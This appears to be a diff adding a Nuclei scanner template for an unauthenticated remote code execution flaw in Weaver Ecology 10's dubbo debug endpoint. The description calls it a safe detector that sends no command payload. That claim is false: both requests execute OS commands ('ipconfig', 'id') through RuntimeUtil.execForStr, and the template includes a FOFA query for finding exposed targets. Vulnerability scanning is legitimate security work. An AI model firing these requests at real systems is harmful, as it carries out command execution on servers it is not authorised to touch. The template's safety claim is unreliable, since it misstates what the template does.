@@ -1,0 +1,61 @@
+id: ecology10-method-execforstr-rce
+
+info:
+  name: Weaver Ecology 10 execForStr - Remote Code Execution
+  author: qwtd
+  severity: critical
+  description: |
+    Article reports an unauthenticated RCE chain in Weaver Ecology 10 (QVD-2026-14149) via:
+    /papi/esearch/data/devops/dubboApi/debug/method (dubbo debug invocation endpoint).
+    This template is a SAFE detector: it only checks whether the endpoint is reachable and responds like a backend API,
+    without sending any command-execution payload.
+  reference:
+    - https://mp.weixin.qq.com/s/ucKOBZDxTOcgEbV9CavOvQ
+  metadata:
+    verified: true
+    max-request: 3
+    fofa-query: icon_hash="-1619753057"
+    vuln-labels: OA
+  tags: 泛微-协同办公OA
+
+http:
+  - raw:
+      - |
+        POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/601.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/601.1.15
+
+        [["ipconfig"]]
+
+      - |
+        POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json;charset=utf-8
+        timeZoneOffset: -480
+        langType: zh_CN
+        Content-Length: 12
+        Connection: close
+        Sec-Fetch-Dest: empty
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Site: same-origin
+
+        [["id"]]
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+          - “Windows IP”
